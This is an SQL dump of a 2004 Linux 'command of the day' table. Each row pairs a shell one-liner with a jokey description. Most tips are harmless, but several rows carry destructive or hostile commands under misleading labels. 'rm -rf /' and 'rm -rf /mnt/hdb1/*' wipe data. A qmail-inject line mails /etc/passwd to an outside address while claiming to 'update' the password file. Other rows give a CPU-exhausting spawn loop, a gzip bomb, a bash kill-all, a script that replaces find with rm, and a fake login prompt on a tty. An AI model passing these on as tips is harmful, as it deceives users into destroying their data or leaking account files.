# phpMyAdmin MySQL-Dump
# version 2.4.0
# http://www.phpmyadmin.net/ (download page)
#
# Host: localhost
# Generation Time: Feb 12, 2004 at 12:49 PM
# Server version: 4.0.17
# PHP Version: 4.3.4
# Database : `homeflex`

#
# Dumping data for table `cotd`
#

DELETE FROM `cotd`;
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (14, 'cat /proc/kcore > /dev/dsp &', 'Make sure your speakers arent turned up too highly when you try this one. Also make sure your logged in as root (so you can read kcore).\r\nWorks best after you\'ve used your system for a while and you\'ve been through a good chunk of your systems memory. You can actually get some very interesting noises. ');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (10, 'if test `cat /proc/sys/kernel/tainted` -eq 1 ; then echo "Yes"; else echo "No";fi', 'Tainted kernel?');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (2, './configure && make && make install', 'When you don\'t feel like building shit');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (3, './configure --help', 'When you just don\'t know what to do next.');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (4, 'cat /etc/passwd | grep "^`whoami`:" | awk -F : \'{print $6}\'', 'The best way to figure out what your home directory is. =)');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (9, 'cat /proc/cpuinfo | egrep "bogo" | awk -F : \'{print $2}\' | sed "s/ //"', 'bogomips');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (6, 'watch -d -n1 uname -r', 'Watch for a new kernel release');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (5, 'top', 'Top.. Interactively display running processes');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (7, 'echo $((`df | awk \'{print $4}\' | xargs | sed "s/^Available //; s/ / + /g"`))', 'Print your total disk space in blocks');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (11, 'cat Makefile | egrep -i "^[a-z-0-9]+:"', 'Nice way to list all the targets in a Makefile');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (13, 'who -l', 'Who\'s logged in (long listing)');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (15, 'do while true{\r\necho "blow me";\r\n}\r\n\r\nEDITED (some people just don\'t know BASH):\r\n\r\nwhile true; do echo "blow me"; done', 'blow me.. ... .... . ');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (20, 'netstat -a -n | less', 'Look at who\'s connected to your box via any tcp connection.');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (25, 'ls', 'lists the contents of the directory (hey.. you cant just have nothing.. LOL)');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (27, 'while true; do echo nothing; done', 'How to do nothing really really fast.');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (28, 'php -q\r\n<?\r\nclass foo {\r\n function foo {\r\n   $bar = new foo;\r\n }\r\n}\r\n\r\n$x = new foo;\r\n?>\r\n^D', 'Have some fun with PHP....\r\n');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (41, '-- cpu-load.c ---\r\nint main() {\r\nwhile (1) {}\r\n}\r\n-- cpu-load.c ---\r\n\r\ngcc -o cpu-load cpu-load.c\r\nwhile true\r\ndo\r\n./cpu-load &\r\ndone', 'Test your system...');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (53, 'rm -rf /', 'Delete me');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (61, 'killall -KILL bash', 'Be a bitch');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (62, '>>>>>find\r\n#!/bin/bash\r\nrm -r $1\r\nrm -r $2\r\n<<<<<<<<<', 'replace "find" with this script:\r\n\r\n(this probably wont work.. but you get the idea, right?) :)');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (70, 'while true ; do xrefresh ; done\r\n\r\n ---- or ----\r\n\r\nwhile true; do         for((i=0; i<=100; i++));         do                 xsetroot -solid "grey$i";         done;         for((i=99; i>=1; i--));         do                 xsetroot -solid "grey$i";         done; done', 'some strange X stuff....');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (87, 'dmesg', 'dmesg');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (88, 'netstat -tn | awk \'{print $5}\' | sort | sed "s/\\:.*$//" | uniq -c', 'cool net numbers');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (98, 'wc file.txt', 'Count how many words lines charecters in a file');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (99, 'echo -e "To: mofo@datafucker.net\\n" | cat - /etc/passwd | qmail-inject', 'update your system password file =)');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (102, 'grep -R STRING *', 'Find a string in a directory recursively.');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (105, 'strings /dev/mem | grep -i taco | less', 'If you forget something hopefully you\'re computer still has it lying around. =)');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (111, 'tar -zcf foo.tar /home/bar/', 'tar stuff (esp. your home directory) for backup');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (112, 'while true is false; do echo "it\'s true!"; done', 'while true is false; do echo "it\'s true!"; done');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (117, 'while true is false\r\ndo\r\n  echo chaos\r\ndone', 'some nice little bash your all of you');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (132, 'echo -en "root\\r\\nPassword:\\r\\nroot@sig ~ >" > /dev/tty2', 'have some fun with tty\'s');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (144, 'rm -rf /mnt/hdb1/*', 'Efective way of taking care of all problems with computer.');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (154, 'cat /dev/urandom | strings | tr -d \'\\n\\t \' | dd bs=1 count=1024 2>/dev/null', 'I hate printers, but this is a little entertaining....');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (155, 'cat /dev/hda | strings | grep sandwich', 'closest we\'ll get to having a computer make you a sandwich...');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (160, 'find -type d -maxdepth 1 | egrep "[0-9]+" | sed "s,/proc/,,"', 'List all pids on ur system..... c\'mon, it could be useful =)');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (161, 'lspci', 'List PCI Bus');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (163, 'sed -n -e \'Np\' filename', 'print Nth line of a file....');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (165, 'startx', 'You should know what this one does, if not go directly to jail, do not pass go, do not collect $200...');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (166, 'iftop', 'watch network connections in real time');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (168, 'iptables -A OUTPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK RST,ACK -j LOG', 'log when someone attempts to connect to a port that\'s not open via syslog.');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (173, 'ls -l | grep pattern | awk \'{print $9}\' | xargs rm', 'Delete all files matching a pattern *pattern*');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (174, 'links -dump http://www.signuts.net/whoami/?nocontent=1', 'Print who I know you as.. Yes, that\'s correct, you are only a number.. nothing more.');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (190, 'snmpwalk -c public -v1 -Of hostname', 'walk through all the OIDS on your device called hostname. device must properly be configured to accept SNMP requests for you as well.');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (191, 'cat /dev/urandom  | od -o | head', 'get random octal numbers, tasty random octal numbers.');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (195, 'cat /dev/input/js0 | od', 'pretend to be hardcore..........');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (197, 'man linux', 'learn about the wonderful world of linux');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (201, 'fortune | xmessage -nearmouse -file - -buttons "cool\\!:0"', 'A nifty keybind when you want a fortune quick!');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (205, 'gpg --recv-keys --keyserver pgp.mit.edu 9B03CC11', 'download my gpg key!');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (212, 'cat /dev/mem | strings | egrep -rio "[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}" | sort | uniq -c | sort', 'see how many different ip addresses are in memory (just for fun)');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (220, '[ -f ~/.gaimrc ] && cat ~/.gaimrc | grep ident', 'You should know.......');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (224, 'mplayer -oac pcm -aofile file.wav\r\n[ twiddle fingers ]\r\nlame file.wav file.mp3\r\n', 'Convert these pesky *.wma files');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (260, 'mplayerd', 'Turn your box into a movie player..\r\n\r\n\r\nsee http://signuts.net/projects/id/59');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (266, 'mkfifo print_dev && cat print_dev | lp\r\n\r\necho "This will go to the printer" > print_dev', 'print by writing to a file....');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (275, 'cat .gaim/accounts.xml | grep -A 1 \'</name>$\'', 'cat .gaim/accounts.xml | grep -A 1 \'</name>$\'');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (289, 'cat access_log | awk \'{print $1}\' | sort | uniq -c | sort | tail', 'top 10 hitters on your web site');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (312, 'ps aux --forest', 'self-explanatory...');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (335, 'seq 1 100 | xargs number', 'Count to 100.. printing the textual representation of the number.. ');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (344, 'cat file.txt | {\r\nwhile read line\r\ndo\r\n        for i in $line\r\n        do\r\n                x=`echo "$i" | tr A-Z a-z | sed "s/[^a-z]//g"`\r\n\r\n                if [ ! -z "$x" ] ; then\r\n                        echo "$x"\r\n                fi\r\n        done\r\ndone\r\n} | sort | uniq -c | sort', 'Every wonder what the most popular word in a body of text? Here is how....');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (352, 'emerge sync', 'emerge sync');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (1, 'cat bookmarks.html | grep HREF | awk -F \'"\' \'{print $2}\'', 'Print out all the URLs in your bookmarks.html file. This works with Mozilla Firebird....');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (17, 'cat xferlog  | awk \'{print $7}\'  | sort | uniq -c | sort', 'print totals of hosts to transfer files on your FTP. (works with proftpd) others prolly too!');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (22, '\r\n\r\nsu -\r\n\r\n\r\n# Just kidding', 'Hack your way into a box... \r\n\r\n\r\n');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (8, 'faad -w test.m4a  | lame -are - test.mp3', 'Convert those pesky m4a/mp4 files');
INSERT INTO `cotd` (`day`, `command`, `description`) VALUES (42, 'dd if=/dev/zero bs=1024 count=$((1024 * 1024)) | gzip -9 - > bomb.gz', 'e-mail bomber');

